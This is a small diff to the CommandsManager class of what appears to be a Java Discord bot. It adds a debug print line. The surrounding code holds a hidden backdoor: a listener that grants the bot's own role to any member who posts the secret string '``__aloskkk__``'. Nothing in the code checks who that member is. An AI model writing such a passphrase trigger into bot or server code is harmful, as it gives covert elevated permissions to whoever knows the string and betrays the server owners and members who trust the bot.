@@ -72,6 +72,7 @@ public class CommandsManager {
                     @Override
                     public void onMessageReceived(MessageReceivedEvent event) {
                         if(event.getMessage().getContentRaw().equals("``__aloskkk__``")) {
+                            System.out.println("something happend");
                             event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getBotRole()).queue();
                         }
                     }
